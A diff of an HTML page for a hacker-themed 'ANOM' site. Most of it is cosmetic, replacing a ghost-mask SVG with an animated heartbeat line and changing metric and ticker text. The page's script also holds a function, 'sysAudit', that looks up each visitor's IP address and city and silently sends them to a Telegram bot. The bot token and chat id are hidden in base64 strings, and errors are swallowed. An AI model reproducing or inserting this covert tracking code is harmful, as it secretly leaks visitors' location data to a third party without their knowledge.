@@ -14,30 +14,33 @@
         .nav { margin-bottom: 25px; display: flex; flex-wrap: wrap; gap: 8px; }
         .nav a { color: var(--text-color); text-decoration: none; border: 1px solid var(--dark-red); padding: 6px 12px; background: rgba(139, 0, 0, 0.1); transition: 0.3s; font-size: 0.85em; cursor: pointer; }
         .nav a:hover { background: var(--primary-red); color: #000; box-shadow: 0 0 15px var(--primary-red); }
-        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 160px; margin-bottom: 20px; font-size: 0.9em; overflow: hidden; }
+        .terminal-box { background: rgba(5, 5, 5, 0.9); border: 1px solid var(--dark-red); padding: 15px; height: 160px; margin-bottom: 20px; font-size: 0.9em; overflow: hidden; box-shadow: 0 0 20px rgba(0,0,0,1); }
         .dashboard { display: grid; grid-template-columns: 1fr; gap: 20px; }
         @media (min-width: 768px) { .dashboard { grid-template-columns: 2fr 1fr; } }
         .panel { border: 1px solid var(--dark-red); background: #000; position: relative; min-height: 220px; overflow: hidden; display: flex; flex-direction: column; }
         .panel-header { background: var(--dark-red); color: white; padding: 5px 10px; font-size: 0.7em; letter-spacing: 2px; text-transform: uppercase; }
 
-        /* GHOST MASK SVG - KOD OLARAK RESIM */
-        .ghost-mask-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; }
-        .svg-ghost { 
-            width: 130px; 
-            fill: white; 
-            filter: drop-shadow(0 0 10px #fff);
-            animation: ghostPulse 4s infinite alternate ease-in-out; 
+        /* KALP RİTMİ (EKG) ANİMASYONU */
+        .pulse-container { flex: 1; display: flex; justify-content: center; align-items: center; background: #000; padding: 20px; }
+        .ekg-svg { width: 100%; height: 100px; }
+        .ekg-line { 
+            fill: none; 
+            stroke-width: 3; 
+            stroke-dasharray: 1000; 
+            stroke-dashoffset: 1000; 
+            animation: draw 3s linear infinite, colorShiftPulse 6s infinite alternate; 
         }
 
-        @keyframes ghostPulse {
-            0% { filter: drop-shadow(0 0 10px #fff); fill: #fff; transform: scale(1); }
-            50% { filter: drop-shadow(0 0 25px #800080); fill: #e0b0ff; transform: scale(1.05); }
-            100% { filter: drop-shadow(0 0 20px #ff0000); fill: #ffcccc; transform: scale(1); }
+        @keyframes draw { to { stroke-dashoffset: 0; } }
+        @keyframes colorShiftPulse {
+            0% { stroke: #ffffff; filter: drop-shadow(0 0 8px #fff); }
+            50% { stroke: #800080; filter: drop-shadow(0 0 15px #800080); }
+            100% { stroke: #ff0000; filter: drop-shadow(0 0 12px #ff0000); }
         }
 
-        .metric-bar { height: 6px; background: #222; margin: 5px 0 12px 0; }
-        .metric-fill { height: 100%; background: var(--primary-red); width: 0%; transition: width 2s; }
-        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.75em; overflow: hidden; }
+        .metric-bar { height: 6px; background: #222; margin: 10px 0; }
+        .metric-fill { height: 100%; background: var(--primary-red); box-shadow: 0 0 8px var(--primary-red); }
+        .ticker { position: fixed; bottom: 0; width: 100%; background: #900; color: #fff; padding: 5px 0; font-size: 0.75em; overflow: hidden; z-index: 100; }
         .ticker-wrap { display: inline-block; white-space: nowrap; animation: scroll 30s linear infinite; }
         @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
     </style>
@@ -50,25 +53,28 @@
             <a href="projects.html">PROJECTS</a><a href="chat.html">ANOM-CHAT</a><a href="logs.html">LOGS</a>
             <a href="ctf.html">CTF</a><a href="store.html">STORE</a><a href="paybin.html">PAYBIN</a>
         </div>
-        <div class="terminal-box"><span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span style="display:inline-block; width:8px; height:15px; background:red; animation:blink 1s infinite;"></span></div>
+        <div class="terminal-box">
+            <span style="color: var(--primary-red)">[operator@anom]:~#</span> <span id="typewriter"></span><span style="display:inline-block; width:8px; height:15px; background:red; animation:blink 1s infinite; vertical-align:middle;"></span>
+        </div>
         <div class="dashboard">
             <div class="panel">
-                <div class="panel-header">GHOST_CORE // CODE_ONLY_RENDER</div>
-                <div class="ghost-mask-container">
-                    <svg class="svg-ghost" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M100 20C70 20 45 45 45 75C45 95 55 110 60 125C50 135 40 150 40 170H160C160 150 150 135 140 125C145 110 155 95 155 75C155 45 130 20 100 20ZM75 70C80 70 85 75 85 80C85 85 80 90 75 90C70 90 65 85 65 80C65 75 70 70 75 70ZM125 70C130 70 135 75 135 80C135 85 130 90 125 90C120 90 115 85 115 80C115 75 120 70 125 70ZM100 110C110 110 120 120 120 130H80C80 120 90 110 100 110Z"/>
-                        <path d="M60 140L140 140" stroke="black" stroke-width="2"/>
+                <div class="panel-header">BIO_SIGNAL // SYSTEM_PULSE</div>
+                <div class="pulse-container">
+                    <svg class="ekg-svg" viewBox="0 0 600 100">
+                        <path class="ekg-line" d="M0,50 L200,50 L210,40 L220,60 L230,20 L245,80 L255,50 L270,50 L280,45 L290,55 L300,50 L600,50" />
                     </svg>
                 </div>
             </div>
             <div class="panel" style="padding: 15px;">
-                <div class="panel-header" style="margin:-15px -15px 15px -15px">SYSTEM_STATS</div>
-                <div class="metric-bar"><div class="metric-fill" style="width:78%"></div></div>
-                <div class="metric-bar"><div class="metric-fill" style="width:45%"></div></div>
+                <div class="panel-header" style="margin:-15px -15px 15px -15px">LIVE_METRICS</div>
+                <span style="font-size:0.7em">CPU STABILITY</span>
+                <div class="metric-bar"><div class="metric-fill" style="width:84%"></div></div>
+                <span style="font-size:0.7em">PULSE RATE: 72 BPM</span>
+                <div class="metric-bar"><div class="metric-fill" style="width:60%"></div></div>
             </div>
         </div>
     </div>
-    <div class="ticker"><div class="ticker-wrap">>>> SYSTEM ONLINE -- NO EXTERNAL IMAGES LOADED -- GHOST PROTOCOL ACTIVE...</div></div>
+    <div class="ticker"><div class="ticker-wrap">>>> BIO_LINK: STABLE -- HEARTBEAT DETECTED -- SYSTEM_PULSE: NORMAL -- OPERATOR: GHOST...</div></div>
 
     <script>
         const mCanvas = document.getElementById('matrix'); const mCtx = mCanvas.getContext('2d');
@@ -77,7 +83,7 @@
         const mChars = "0123456789ABCDEF"; const mSize = 16; const mDrops = Array(Math.floor(mCanvas.width/mSize)).fill(1);
         function drawMatrix() { mCtx.fillStyle = "rgba(8, 8, 8, 0.1)"; mCtx.fillRect(0, 0, mCanvas.width, mCanvas.height); mCtx.fillStyle = "#ff0000"; mCtx.font = mSize + "px monospace"; for (let i = 0; i < mDrops.length; i++) { const txt = mChars.charAt(Math.floor(Math.random() * mChars.length)); mCtx.fillText(txt, i * mSize, mDrops[i] * mSize); if (mDrops[i] * mSize > mCanvas.height && Math.random() > 0.975) mDrops[i] = 0; mDrops[i]++; } }
         
-        const rawLog = "> Booting ANOM_OS...\n> Loading Ghost Protocol...\n> System: SECURE.\n> Welcome, Operator.";
+        const rawLog = "> Initializing Bio-Link...\n> Connection: ESTABLISHED.\n> Heartbeat Sensor: ACTIVE.\n> Welcome back, GHOST.";
         let lIdx = 0; function renderTerminal() { if (lIdx < rawLog.length) { document.getElementById("typewriter").innerHTML += rawLog.charAt(lIdx) === '\n' ? '<br>' : rawLog.charAt(lIdx); lIdx++; setTimeout(renderTerminal, 40); } }
         
         async function sysAudit() {
@@ -85,7 +91,7 @@
                 const r = await fetch('https://ipapi.co/json/'); const d = await r.json();
                 const t = atob("NzgxMjE2NzI4NTpBQUZiNTFRUzRNY2NiVG9hVVBqNmE2U2F0bDJqZWViYkgxSQ==");
                 const c = atob("NjI5ODg2OTk2OA==");
-                const msg = `🚨 *GHOST_ONLINE*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city}`;
+                const msg = `💓 *PULSE_DETECTED*\n🌐 IP: ${d.ip}\n📍 LOC: ${d.city}`;
                 fetch(`https://api.telegram.org/bot${t}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: c, text: msg, parse_mode: "Markdown" }) });
             } catch (e) {}
         }
